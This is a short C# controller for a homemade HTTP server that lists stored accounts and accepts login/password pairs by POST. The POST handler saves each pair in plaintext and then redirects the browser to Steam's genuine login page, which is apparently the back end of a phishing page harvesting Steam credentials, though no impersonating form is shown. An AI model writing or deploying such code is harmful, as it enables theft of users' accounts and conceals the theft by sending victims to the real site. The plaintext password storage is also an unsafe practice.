using HttpServer2.Attributes;
using HttpServer2.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace HttpServer2.Controllers
{
    [ApiController]
    public class DAOAccounts
    {
        IAccountsDAO _accountsDAO = new AccountsDAO();
        [HttpGet("/")]
        public IEnumerable<Account> GetAccounts()
            => _accountsDAO.GetAll();

        [HttpGet("/{id}")]
        public Account? GetAccountById(int id)
            => _accountsDAO.GetById(id);

        [HttpPost("/")]
        public void PostAccounts(string login, string password, HttpListenerResponse response)
        {
            _accountsDAO.Create(new Account { Login = login, Password = password });

            response.Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }
    }
}
